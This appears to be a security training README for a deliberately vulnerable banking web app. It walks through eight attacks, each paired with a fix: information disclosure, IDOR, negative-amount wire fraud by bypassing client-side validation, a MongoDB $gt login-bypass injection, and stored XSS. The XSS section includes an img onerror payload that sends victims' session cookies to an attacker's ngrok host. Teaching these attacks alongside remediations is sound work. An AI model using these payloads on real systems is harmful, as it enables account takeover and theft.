# Hacking Guide

This document aims to be used as guide for the diffent attacks that are possible to perform in master and the solutions for each of them developed in each attack branch

## Attacks:

### 1. Source code info
While in **master** branch, we just need to check the performed requests and the headers answered by the server.
We will see something like the following

```
X-Powered-By:Express
```

Apparently this should not be any security issue itself but it might be useful for an attacker to get info about the architecture of the application.
In this case, knowing that the application is Powered by Express, we could know that we are using NodeJS in the backend and so javascript so we could try to find out what vulnerabilities exists in Express or NodeJS, like trying to do a javascript injection to the server.

#### Solution:
This has a very simple fix by adding a line in the api definition to avoid using this header:

```
app.set('x-powered-by', false);
```

Please note that this solution is only valid for Express and each component used should have its own way to unset the custom headers.

solution checkout:
```
https://github.com/eBorland/bank-hacking/pull/1
```

### 2. Error stacktraces
While in **master** branch, we could change the requests of some parameters in order to crash the server and we can see how the server sends back the error stacktraces.
Running the following request we will see how the server sends back an error trace:
```
curl -H "Content-Type: application/json" -X PUT -d '{"_id": "invalidMongoDBId", "answer": "I do not know"}' http://localhost:4000/reset-password
``` 

And we get the following response:
```
Error: Argument passed in must be a single String of 12 bytes or a string of 24 hex characters
	at new ObjectID (/root/workspace/sopra/bank-hacking/node_modules/bson/lib/bson/objectid.js:50:11)
	at User.resetPassword (/root/workspace/sopra/bank-hacking/api/models/user.js:136:10)
	at resetPassword (/root/workspace/sopra/bank-hacking/api/routes/user.js:60:8)
	at Layer.handle [as handle_request] (/root/workspace/sopra/bank-hacking/node_modules/express/lib/router/layer.js:95:5)
	at next (/root/workspace/sopra/bank-hacking/node_modules/express/lib/router/route.js:137:13)
	at Route.dispatch (/root/workspace/sopra/bank-hacking/node_modules/express/lib/router/route.js:112:3)
	at Layer.handle [as handle_request] (/root/workspace/sopra/bank-hacking/node_modules/express/lib/router/layer.js:95:5)
	at /root/workspace/sopra/bank-hacking/node_modules/express/lib/router/index.js:281:22
	at Function.process_params (/root/workspace/sopra/bank-hacking/node_modules/express/lib/router/index.js:335:12)
	at next (/root/workspace/sopra/bank-hacking/node_modules/express/lib/router/index.js:275:10)
```

This response, as we can see, give us a lot of information about:
- The language used in the server
- The database used
- A couple of libraries used
- The directory structure of the server itself

This is dangerous because it could be used by any hacker to perform an attack.

#### Solution:
To avoid this we should always control the errors and sanitize the response before send it back to the client.

We added an error handler middle in Express (again, this depends on the language, framework or technology used) to sanitize all responses.

solution checkout:
```
https://github.com/eBorland/bank-hacking/pull/d
```

### 3. Get user images
With a bit of Application Interpretation (of Spoofing) we can find out what request the application does in order to get the user images.
Taking a look at the profile image url we will see something like the following:
```
http://localhost:4000/assets/30.jpg
```

That is very easy to get and understanding that other users may be using similar urls we can try to get images from urls like the following:
```
http://localhost:4000/assets/7.jpg
http://localhost:4000/assets/3.jpg
http://localhost:4000/assets/13.jpg
```

This is very basic but a huge service like Facebook does something similar yet today. If you are able to find out what hash will be used to store any image, you can open that image no matter if you are logged in Facebook, or if the image is set as private.

#### Solution:
The proper way to avoid this is serving the images through the API or having some authentication control like a signature in the image get request.
In our case we decided to serve the images via de API and checking always the session to make sure the user has access to that image.

solution checkout:
```
https://github.com/eBorland/bank-hacking/pull/3
```

### 4. Get user info without session validation
Again with Spoofing we can find out how to get information about the user like the name, the email and the image. The performed request is the following:
```
GET http://localhost:4000/info/:id
```

That could mean that if we get the id of any user we could get its info as well.
Investigating a little more, we can se what the application does when trying to recover your password. When requesting the recover question the application does the following request:
```
GET http://localhost:4000/recover/:email
```

Usually, emails are public (or in our case, you could find out by sniffing the trafic) and we could perform the following request:
```
curl http://localhost:4000/recover/admin@google.com
```

And we would receive the following piece of information:
```
{
  "_id":"58fa5a128e9185013e75417d",
  "question":"Where were you born?"
}
```

Now that we got the _id of the Google admin, we could request its info using a valid cookie that we can get from our own session:
```
curl -H "Cookie: connect.sid=s%3AmbCBZYnL3l5EUchapclqHHXOrJW6uKZE.sDjtJaIpeY9Y8%2FwFzULbVWAzbi1c5iY90a44H%2Fb9FJ4" http://localhost:4000/info/58fa5a128e9185013e75417d
```

And we will get the information below:
```
{
  "_id": "58fa5a128e9185013e75417d",
  "email": "admin@google.com",
  "fullName": "Google Inc Administrator",
  "image": "20.jpg",
  "accountNumber": "US89 3704 0044 0532 0130 00"
}
```

#### Solution:
We should never rely on the params sent by the user and we should use the session to check if the logged user has access to the requested resource. The fact tha params like these ids are pretty random does not mean the attacker can not guess or get them from any other place.

We protected this route (keep in mind we should protect all of them as well) in the server by removing the id param and getting it from the session

solution checkout
```
https://github.com/eBorland/bank-hacking/pull/4
```

### 5. Traffic sniffing
Since we are exposing both the app and the api via HTTP all traffic is done in text-plain and can be easily sniffed.
To avoid that we created a Self-signed SSL Certificate in order to encript the traffic. Since it is a self-signef certificate, the browsers will not accept it as valid origin recognizer but at least the traffic will be encrypted.

#### Solution:
Create a SSL certificate and expose both the api and the app via HTTPS

solution checkout
```
https://github.com/eBorland/bank-hacking/pull/5
```

### 6. Client side only validation
When sending money to another user, there are two client side validations: You cannot send negative money and you cannot change the origin of the transaction. But are those a robust validations?
In the first case, when writing a negative value in the amount input you will receive an error message and your transaction will not be performed. But we can try to do that request skipping the client side validation.
Following these steps we can achieve that:
1) Login in the browser and get your cookie sid by writing document.cookie in the console. You will receive something like the following:
```
> document.cookie
"connect.sid=s%3AMb_5H7JDPgTbndJcbwebR5-RUlxvJM85.YygrN%2By%2FWbndrmAmhwBvgwnn%2Fky1hs%2Bznt6ojO3%2FGyQ"
```

Once we have the cookie we can perform any request as if we were logged in. 
2) Now taking a look at the request performed by the application when sending money we can fake it chaging the amount value:
```
curl -H "Cookie: connect.sid=s%3AHvPqWHh6GEvJBO60mC4lz1fZTC0cdYAH.Q8XxJl3QlM%2BqwT5kiq12AVuk3Di4wcS%2F%2BtAoFqGZKSg" -H "Content-Type: application/json" -X POST -d '{"source": "US89 3704 0044 0532 0130 00", "account": "US02 2931 2213 9320 0100 22", "amount": -1000, "message": ""}' http://localhost:4000/wire
```

The request will be accepted and we will see how we got +1000€ in our favor after this request.

Anoher client-side validation is the origin account number of the transaction that is a disabled input the user cannot change. But is that true?
It just requires inpecting the element and removing the "disabled" property of that input.
Once the disabled input has been removed, the origin can be changed, and you can send money from a different source than your own account.
The attacker can use that to send money from another account to its own.


#### Solution:
In both cases, the solution is to apply controls and validations ALWAYS in backend. The client-side validations are nice from the UX point of view, but very vulnerable from the Security point of view.
We must maintain the client-side validations but also replicate the same validations in backend.

In this case we added a control in the source of the transaction and avoiding negative numbers in the ammount field.

solution checkout:
```
https://github.com/eBorland/bank-hacking/pull/6
```

### 7. MongoDB Injection
Once thing we could guess by the urls and the parameters send in the different requests is that we are using a MongoDB Database since they use a 24-hexadecimal digit ids, which are everywhere around the application.
Knowing that MongoDB is the database, we could search how to make a MongoDB Injection in the login, for example.
In this case, the server is not protected on that and we could login as any user without knowing their password.

It just takes again a bit of research of the login request and a simple curl with a MongoDB query in the password field like the following:
```
curl -H "Content-Type: application/json" -X POST -d '{"email": {"$gt": ""}, "password": {"$gt": ""}}' http://localhost:4000/login
```

In MongoDB the query $gt means Greather than, so that query would match the first user in the database with email and password grather than an empty string which are ALL users. Once we logged in as one user, we could start chaging that query injection to login as the other users.

#### Solution:
To solve this, we must never allow any kind of injection. Each injection has its nature and, for instance in SQL Injection, we should never do string concatenation with the parameters sent by the user.
In the case of MongoDB we should never allow the inputs sent by the user to end up in a query without previous validation. To fix this, we can force the parameters to be always a string and never an object

solution checkout:
```
https://github.com/eBorland/bank-hacking/pull/7
```

### 8. XSS
Cross-site scripting is one of the most famous attacks in webservers.
In this case, send sending money we could see that the message of the transaction allows html code.
When rendering that html code in the global position, there is no sanitization and any attacker could use it to perform an XSS attack.

To perform this attack, you can follow the steps below:
1) Download ngrok to be able to receive requests
2) Once you downloaded (and installed if necessary) ngrok, you can expose a server, for example in the port 4500 with the following command:
```
./ngrok http 4500
```

And you will receive the following output:
```
ngrok by @inconshreveable

Session Status                online
Version                       2.2.4
Region                        United States (us)
Web Interface                 http://127.0.0.1:4040
Forwarding                    http://8350aae8.ngrok.io -> localhost:4500
Forwarding                    https://8350aae8.ngrok.io -> localhost:4500

Connections                   ttl     opn     rt1     rt5     p50     p90
                              0       0       0.00    0.00    0.00    0.00
```

As you can see, your server is exposed in http://8350aae8.ngrok.io and you could redirect any request to there in order to get data from other users.
In this case, we will try to get the sid cookie of a user that received our transaction.

3) Send money to any other account with the following message:
```
<img src="http://8350aae8.ngrok.io/image" onerror="this.src='http://8350aae8.ngrok.io/hacked/cookie='+document.cookie" height="1px" width="1px" />
```

4) And then, when the receiver of the money logs in and sees its transaction list, the browser performs the following request:
```
GET http://8350aae8.ngrok.io/hacked?cookie=connect.sid=s%3A_lUKxbsqbksRmFntAgIOK-FB6obJ-x5t.CbSvt1ZZnAOrkscC85JpPTAZYfWf2Vc3dGUN4ykZZnI
```

5) Once the browser has performed that request, you just need to check your ngrok logs to find the sid of your victim:
```
GET /hacked/cookie=connect.sid=s:_lUKxbsqbksRmFntAgIOK-FB6obJ-x5t.CbSvt1ZZnAOrkscC85JpPTAZYfWf2Vc3dGUN4y 502 Bad Gateway
```

Once you get its sid you can perform request on behalf of your victim, for example.

#### Solution:
To solve this, we MUST sanitize the HTML sent before to render it. Angular (and pretty much all frameworks) includes a module to do so in a very easy way.
Once we sanitize the html, we will see how the browser does not send request anymore since that piece of HTML is never rendered but included as a string.

solution checkout:
```
https://github.com/eBorland/bank-hacking/pull/8
```
